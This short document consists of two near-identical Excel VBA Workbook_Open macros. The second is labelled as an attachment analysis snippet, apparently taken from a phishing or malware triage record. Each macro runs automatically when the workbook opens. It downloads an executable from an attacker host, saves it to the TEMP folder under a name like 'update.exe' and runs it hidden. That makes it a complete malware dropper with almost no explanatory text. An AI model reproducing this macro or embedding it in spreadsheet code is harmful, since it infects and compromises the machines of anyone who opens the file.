Sub Workbook_Open()
    Dim URL As String
    URL = "http://malicious-files.net/payload.exe"
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("MSXML2.XMLHTTP")
    WinHttpReq.Open "GET", URL, False
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Dim Stream As Object
        Set Stream = CreateObject("ADODB.Stream")
        Stream.Open
        Stream.Type = 1
        Stream.Write WinHttpReq.ResponseBody
        Stream.SaveToFile Environ("TEMP") & "\update.exe", 2
        Stream.Close
        Shell Environ("TEMP") & "\update.exe", vbHide
    End If
End Sub

attachment_analysis.macro_code_snippet:
Sub Workbook_Open()
    Dim strURL As String
    strURL = "http://ransomware-host.com/payload.exe"
    Dim httpReq As Object
    Set httpReq = CreateObject("MSXML2.XMLHTTP")
    httpReq.Open "GET", strURL, False
    httpReq.Send
    If httpReq.Status = 200 Then
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Open
        stream.Type = 1
        stream.Write httpReq.ResponseBody
        stream.SaveToFile Environ("TEMP") & "\payload.exe", 2
        stream.Close
        Shell Environ("TEMP") & "\payload.exe", vbHide
    End If
End Sub
